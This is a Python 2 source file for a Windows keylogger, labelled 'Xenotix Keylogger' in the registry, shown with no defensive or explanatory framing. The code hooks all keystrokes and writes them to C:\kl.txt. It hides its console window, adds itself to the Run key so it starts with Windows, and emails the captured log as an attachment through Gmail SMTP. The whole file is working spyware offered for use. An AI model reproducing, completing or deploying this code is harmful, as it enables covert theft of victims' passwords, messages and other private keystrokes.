try:
    import pythoncom, pyHook
except:
    print "Please Install pythoncom and pyHook modules"
    exit(0)
import os
import sys
import threading
import urllib,urllib2
import smtplib
import ftplib
import datetime,time

from os.path import basename
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate

import win32event, win32api, winerror
from _winreg import *

#Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "Multiple Instance not Allowed"
    exit(0)
x=''
data=''
count=0

log_path = 'C:\kl.txt'

#Hide Console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def msg():
    print """"""
    return True

# Add to startup
def addStartup():
    fp=os.path.dirname(os.path.realpath(__file__))
    file_name=sys.argv[0].split("\\")[-1]
    new_file_path=fp+"\\"+file_name
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change= OpenKey(HKEY_CURRENT_USER,keyVal,0,KEY_ALL_ACCESS)
    SetValueEx(key2change, "Xenotix Keylogger",0,REG_SZ, new_file_path)

#Local Keylogger
def local():
    global data
    if len(data)>20:
        fp=open(log_path,"a")
        fp.write(data)
        fp.close()
        data=''
    return True

def send_daily():
    ts = datetime.datetime.now()
    SERVER = "smtp.gmail.com" #Specify Server Here
    PORT = 587 #Specify Port Here
    USER=""#Specify Username Here 
    PASS=""#Specify Password Here
    FROM = USER#From address is taken from username
    TO = [""] #Specify to address.Use comma if more than one to address is needed.
    SUBJECT = "Keylogger data: "+str(ts)
    MESSAGE = data

    mensaje = MIMEMultipart(
        From="From: %s" % FROM,
        To="To: %s" % ", ".join(TO),
        Date=formatdate(localtime=True),
        Subject=SUBJECT
    )
    
    try:
        with open(log_path, "rb") as fil:
            mensaje.attach(MIMEApplication(
                fil.read(),
                Content_Disposition='attachment; filename="kl.txt"',
                Name='kl.txt'
            ))

        server = smtplib.SMTP()
        server.connect(SERVER,PORT)
        server.ehlo()
        server.starttls()
        server.login(USER,PASS)
        server.sendmail(FROM, TO, mensaje.as_string())
        server.quit()
        with open(log_path,"w") as fp:
            fp.write('NEW ENTRY %s' % ts)
            fp.write('\n')
            
    except Exception as e:
        print e

def main():
    global x
    if len(sys.argv)==1:
        msg()
        exit(0)
    else:
        if len(sys.argv)>2:
            if sys.argv[2]=="startup":
                addStartup() 
            else:
                msg()
                exit(0)
        if sys.argv[1]=="local":
            x=1
            hide()
            send_daily()
        else:
            msg()
            exit(0)
    return True

if __name__ == '__main__':
    main()

def keypressed(event):
    global x,data
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    data=data+keys 
    if x==1:  
        local()
    
obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()
